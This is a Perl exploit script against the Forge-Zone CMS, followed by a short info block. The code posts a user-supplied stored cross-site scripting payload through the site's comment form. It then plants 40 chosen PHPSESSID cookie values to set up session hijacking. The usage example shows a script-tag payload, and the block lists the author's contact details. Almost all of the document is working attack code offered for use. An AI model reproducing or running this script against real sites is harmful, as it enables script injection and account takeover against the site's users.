#!/usr/bin/perl -Uw

use 5.010;
use strict;
use File::Fetch;
use diagnostics;
use Pod::Usage;
use Getopt::Long;
use Data::Dumper;
use HTTP::Cookies;
use LWP::UserAgent;
use Term::ANSIColor;

BEGIN:



my $options = GetOptions(
			'payload|p=s' => \my $Payload,
			'target|t=s'  => \my $Target, 
			);
			
pod2usage(1) if(not defined($Payload && $Target));

my $cookie_jar = HTTP::Cookies->new(
   file           => "cookie.txt",
   autosave       => 1,
   ignore_discard => 1,
);

my $UserAgent = LWP::UserAgent->new;
$UserAgent->cookie_jar( $cookie_jar );


say colored("\n[*] Target: $Target\n",'blue');
say colored("[+] Reading robots.txt file to find other targets...",'yellow');

my @Uri=split("/",$Target);
File::Fetch->new
			 (
			 uri => "http://$Uri[2]/robots.txt")->
			 fetch(to => \(my $file)
			 );
say($file);


say colored("\n[*] Sending XSS payload\n",'yellow');

my $response = $UserAgent->post($Target, 
                                Content_Type => 'form-data',
                                Content => [
                                           'action'  => "ajouterComment",
                                           'id'      => 3,
                                           'data'    => $Payload,
                                           ]
                               );                               
my $content  = $response->decoded_content();

say colored ("[*] Now collecting 40 valids PHPSESSID in DataBase...",'blue');

for(my $i=1;$i<=40;$i++){
           
           
            my $ua = LWP::UserAgent->new;
            my $cookies = HTTP::Cookies->new();
            $cookies->set_cookie(0,'phpsessid', "Giveme_phpsessid.$i",'/',$Uri[2],80,0,0,86400,0);
            $ua->cookie_jar($cookies);
           
           
           my $Request = $ua->post($Target, 
                                Content_Type => 'form-data',
                                Content => [
                                           'action'  => "ajouterComment",
                                           'id'      => 3,
                                           'data'    => "XXX",
                                           ]
                               );
               my  $Output= $Request->decoded_content();
               my $ValidPhpSessid= $cookies->as_string;
	       
	       my @PhpSessIdCollected = split(/;/, $ValidPhpSessid);
		$PhpSessIdCollected[0] =~ s/Set-Cookie3://g;
	       say colored($PhpSessIdCollected[0],'green');
           
           
}



=info

[1] Description:
	Forge-Zone CMS multiple vulnerabilities:
		- Persistant XSS
		- Auth Bypassing
		- Session HiJacking
		
	Forge-Zone url: http://forge-zone.fr

[2] Example:

	perl fab.pl --target=http://vulnerable-site.com/#\!/blogletter/article/3 --payload=<script>MY XSS</script>
	
[3] Contact (to whip me \o/):
	
	-Emails:
		kmkz[at]tuxfamily[dot]org (for fun)
		mail[dot]bourbon[at]gmail[dot]com
	
	-Tweeter: kmkz_security
	-linkedin:
		[FR] linkedin.com/pub/jean-marie-bourbon/56/928/469
		[EN] linkedin.com/pub/jean-marie-bourbon/56/928/469/en
	-IRC nickname: kmkz

=cut

__END__



